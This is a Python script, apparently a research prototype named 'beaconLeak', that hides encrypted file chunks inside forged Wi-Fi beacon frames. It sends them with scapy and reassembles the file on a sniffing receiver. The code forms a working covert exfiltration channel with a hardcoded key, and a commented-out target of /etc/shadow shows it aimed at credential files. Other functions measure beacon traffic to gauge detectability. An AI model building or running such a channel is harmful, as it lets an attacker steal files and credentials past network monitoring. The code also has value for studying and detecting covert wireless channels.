#!/home/null/.pyenv/bin/python
#

import os
import sys
import time
from datetime import date
import subprocess

import nacl.utils
import nacl.secret
import nacl.hash

from scapy.all import Dot11
from scapy.all import Dot11Beacon
from scapy.all import Dot11Elt
from scapy.all import RadioTap
from scapy.all import sniff
from scapy.all import sendp
from scapy.all import srp1
from scapy.all import hexdump
from scapy.utils import PcapWriter

# globals
global box, t_frame, if0, b_stats, beacons, science

# interface
if0 = "wi7mon"

# test file
#t_file = "/home/null/Downloads/os/Win10_Edu_1803_EnglishInternational_x64.iso"
#t_file = "/etc/shadow"
t_file = "/tmp/test"

# test beacon
ssid = 'beaconLeak'
rates = b'\x82\x84\x0b\x16'
rsninfo = (
    b'\x01\x00'          # RSN Version 1
    b'\x00\x0f\xac\x04'  # Group Cipher Suite : 00-0f-ac CCMP
    b'\x01\x00'          # 1 Pairwise Cipher Suite
    b'\x00\x0f\xac\x04'  # AES Cipher CCMP
    b'\x01\x00'          # 1 Authentication Key Managment Suite:
    b'\x00\x0f\xac\x02'  # Pre-Shared Key
    b'\x0c\x00'          # RSN Capabilities
)
dot11 = Dot11(
    type=0,
    subtype=8,
    addr1='ff:ff:ff:ff:ff:ff',
    addr2='01:02:03:04:05:06',
    addr3='01:02:03:04:05:06'
)
beacon = Dot11Beacon(
    cap='ESS+privacy',
    #timestamp=int(time.time())
)
_ssid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
_rsninfo = Dot11Elt(ID='RSNinfo', info=rsninfo, len=len(rsninfo))
_rates = Dot11Elt(ID="Rates", info=rates, len=len(rates))
t_frame = RadioTap() / dot11 / beacon / _ssid / _rates / _rsninfo

# test crypto
psk = bytes.fromhex('299e29a4d36990bc479d6fed6551a94c7e3da6e10c8cdf9bab9e3c18a04ddee8')
box = nacl.secret.SecretBox(psk)

# stats
b_stats = []
science = {}
beacons = {}

# max size test
def size_test():
    global box, t_frame, if0
    for i in range(65535):
        try:
            m = box.encrypt(('A'*i).encode('ascii'))
            t_elt = Dot11Elt(ID=254, info=m, len=len(m))
            sendp(t_frame / t_elt, iface=if0, loop=0, inter=0.100, count=1, verbose=0)
            #input("Continue...")
        except Exception as e:
            print("[t] Fail at frame: {}, size: {}\n[e] {}".format(i, i*4, str(e)))
            #raise e
            return False
    print("[t] absolute unit!")
    return True

def size_test_breadth():
    global box, t_frame, if0
    for i in range(65535):
        try:
            m = box.encrypt(('A'*i).encode('ascii'))
            t_elt = Dot11Elt(ID=253, info=m, len=len(m))
            t_elt2 = Dot11Elt(ID=254, info=m, len=len(m))
            sendp(t_frame / t_elt / t_elt2, iface=if0, loop=0, inter=0.100, count=1, verbose=0)
            #input("Continue...")
        except Exception as e:
            print("[t] Fail at frame: {}, size: {}\n[e] {}".format(i, i*4, str(e)))
            #raise e
            return False
    print("[t] absolute unit!")
    return True

def live_stats(pkt):
    global b_stats
    b_stats.append(len(pkt))
    

def beacon_size_stats():
    global b_stats
    start = time.time()
    gmt = time.strftime('%d.%m.%Y %H:%M:%S', time.gmtime(start))
    print("\t[i] start time: {} GMT".format(gmt))
    pkts = sniff(iface=if0, 
        lfilter=lambda pkt: pkt.haslayer(Dot11Beacon), 
        prn=live_stats,
        timeout=(60*5)
    )
    end = time.time()
    print("\t[m] ended, seconds elapsed: {}".format(end - start))
    avg = sum(b_stats) / float(len(b_stats))
    print("[m] total beacons: {} (sanity check: {})".format(len(pkts), len(b_stats)))
    print("[m] average beacon size: {}".format(avg))

def do_science(pkt):
    global beacons
    try:
        beacons[pkt.addr2] += 1
    except KeyError as e:
        beacons[pkt.addr2] = 1
    

def beacon_histogram():
    import pprint, json
    global beacons, science
    channels = range(1,14)
    start = time.time()
    gmt = time.strftime('%d.%m.%Y %H:%M:%S', time.gmtime(start))
    f_prefix = time.strftime('%d.%m.%Y-%H:%M:%S', time.gmtime(start))
    print("[*] start time: {} GMT".format(gmt))
    # clear data
    beacons = {}
    for ch in channels:
        print("\t[i] channel: ", ch)
        subprocess.run("iw dev {} set channel {}".format(if0, ch), shell=True)
        pkts = sniff(iface=if0, 
            lfilter=lambda pkt: pkt.haslayer(Dot11Beacon), 
            prn=do_science,
            timeout=(60*1)
        )
        b_uniq = len(beacons.keys())
        b_total = sum(beacons.values())
        p_total = len(pkts)
        if p_total > 0:
            b_size_avg = sum([len(p) for p in pkts]) / float(p_total)
        science[ch] = {'b_uniq':b_uniq, 'b_size_avg':b_size_avg, 'b_total':b_total}
        print("\t[i] unique beacons: {}, size avg: {}, total beacons: {} (sanity:{})".format(b_uniq, b_size_avg, b_total, b_total==p_total))
        n_pcap = '{}-ch{}.pcap'.format(f_prefix, ch)
        f_pcap = PcapWriter(n_pcap)
        f_pcap.write(pkts)
        print("\t[i] wrote packets to: {}\n".format(n_pcap))
        #cleanup
        beacons = {}
        b_size_avg = 0
        f_pcap.close()
    print("[*] results:\n")
    pprint.pprint(science)
    f_report = '{}-science.json'.format(f_prefix) 
    f = open(f_report, 'w+')
    f.write(json.dumps(science))
    print("[*] results saved to file: {}".format(f_report))
    end = time.time()
    print("[*] end of experiment, duration: {} seconds".format(end - start))


# chunk encrypt test (omg overhead)
def send_file():
    max_size = 325
    f = open(t_file, 'rb')
    file_size = f.seek(0, 2)
    print(f"\t[i] file size: {file_size} octets")
    # QoS and Covert case
    # y=(x+40)/((a - b) - (log10(x) + 41)) 
    # d = a - Or - Oc1 - Oc2 - Ol1 - Ol2 - m
    # TODO this can be optimized by counting in bytes instead, think ASN.1 or similar
    import math
    #print(f"\t[i] frame overhead: {len(t_frame)}")
    approx = max_size - len(t_frame) - 84
    magic = math.ceil(math.log10(file_size / approx) + 1) # sacrifice to the god of statistics
    #print(f"\t[i] magic number: {magic}")
    #chunks = math.ceil((file_size + 40) / (free - (magic + 40)))
    r_size = approx - magic
    #print(f"\t[i] data space: {r_size}")
    chunks = math.ceil(file_size / r_size)
    print(f"\t[i] beacons needed to send file: {chunks}")
    print("[*] Sending sync frame...")
    end_word = os.urandom(4)
    payload = f"{file_size}:{chunks}:{end_word}".encode('ascii')
    payload_c = box.encrypt(payload)
    _payload = Dot11Elt(ID=222, info=payload_c, len=len(payload_c))
    tmp_frame = t_frame / _payload
    print(tmp_frame.command())
    sendp(tmp_frame, iface=if0, verbose=0, realtime=True)
    input("Press enter to start data transmission...")
    print("[*] Sending data...")
    f.seek(0)
    pos = 0
    start = time.time()
    for seq in range(chunks):           
        m_seq = str(seq).zfill(magic)
        #print(f"\t[i] tag: {m_seq}")
        seq_c = box.encrypt(bytes(m_seq, 'ascii'))
        _seq = Dot11Elt(ID=253, info=seq_c, len=len(seq_c))
        #print(f"\t[i] tag size: {len(_seq)}")
        chunk = f.read(r_size) # crypto ovh + element ovh
        chunk_c = box.encrypt(chunk)
        _data = Dot11Elt(ID=254, info=chunk_c, len=len(chunk_c))
        #print(f"\t[i] encrypted data size: {len(chunk_c)}")
        _frame = t_frame / _seq / _data
        sendp(_frame, iface=if0, verbose=0, realtime=True)
        tell = f.tell()
        print(f"\t[i] sent frame {seq + 1} of {chunks}, data[{pos}:{tell}], frame size: {len(_frame)}")
        pos = tell
        #input("[debug check]")
    end = time.time()
    print(f"[*] sent {chunks} in {end - start} seconds")
    band = (chunks * 325) / (end - start)
    print(f"[*] speed: {band / 1000} kbps")


global recv
recv = dict(
    chunks = 0,
    size = 0,
    tally = None,
    tmp = None,
    done = False,
)
def recv_file(frame):
    global recv
    chunks = recv['chunks']
    tally = recv['tally']
    tmp = recv['tmp']
    done = recv['done']
    if frame.addr2 == t_frame.addr2:
        #print(frame.command())
        # overhead beacon
        if frame[Dot11Elt][6].ID == 222:
            print("[!] Incoming File request found!")
            try:
                msg = box.decrypt(frame[Dot11Elt][6].info)
                s_msg = msg.split(b':')
                f_size = int(s_msg[0])
                chunks = int(s_msg[1])
                tally = [*range(chunks)]
                print(f"\t[i] file size: {f_size}, total chunks: {chunks}")
                tmp = open('/tmp/leak.part', 'w+')
                recv['chunks'] = chunks
                recv['tally'] = tally
                recv['tmp'] = tmp
            except Exception as e:
                print("[e] request not understood, ignoring")
                raise e
        # data beacon
        elif frame[Dot11Elt][6].ID == 253 and chunks > 0 and tmp:
            try:
                ovh = box.decrypt(frame[Dot11Elt][6].info)
                ovh = int(ovh)
                data = frame[Dot11Elt][7].info
                print(f"\t[i] chunk {ovh} received")
                tally.remove(ovh)
                tmp.write(f"{ovh}:{data.hex()}\n")
                if ovh + 1 == chunks:
                    print("[i] last chunk received!")
                    done = True
                    tmp.close()
                    if tally:
                        print(f"[!] missing chunks: {tally}")                
                recv['tally'] = tally
                recv['done'] = done
            except ValueError as e:
                print("[!] received duplicate chunk")
            except Exception as e:
                print(f"[e] corrupted beacon! expected chunk {chunk + (chunk * -1)}")
        # wut
        else:
            print(f"[!] unexpected transmission (sanity:{recv})")
    return done
            
def decode_file():
    import hashlib
    orig = t_file
    saved = '/tmp/leak.part'
    print("[*] Calculating original file sha256 hash")
    h_orig = hashlib.sha256()
    with open(orig, 'rb') as f:
        h_orig.update(f.read())
    d_orig = h_orig.hexdigest()
    print(f"\t{d_orig}")
    print("[*] Decrypting and calculating saved file sha256 hash")
    h_saved = hashlib.sha256()
    with open(saved) as f:
        for line in f:
            info = line.split(':')
            h_saved.update(box.decrypt(bytes.fromhex(info[1])))
    d_saved = h_saved.hexdigest()
    print(f"\t{d_saved}")
    if d_orig == d_saved:
        print("[!] success!!")

# battery of tests
banner = """
     _                       __            _
    | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
    | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
    |___|___|__,|___|___|_|_|_____|___|__,|_,_|
                            by cjcase [test]\n
    """
print(banner)

#print("[*] size test")
#size_test()
#print("[*] size test breadth")
#size_test_breadth()
#print("[*] Surrounding beacon stats")
#beacon_size_stats()
#print("[*] Beacon Size IoC Experiment")
#beacon_histogram()
#print("[*] Send file test")
#send_file()
print("[*] QoS receive file test")
sniff(iface=if0, stop_filter=recv_file, monitor=True)
print("[*] File decode test")
decode_file()